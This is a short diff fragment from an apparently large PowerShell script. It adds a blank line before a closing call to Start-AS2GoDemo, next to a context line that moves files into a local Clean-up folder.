@@ -5073,5 +5322,6 @@ Get-ChildItem ??-*.* | Move-Item -Destination .\Clean-up -Force
 
 #>
 }
+
 
 Start-AS2GoDemo
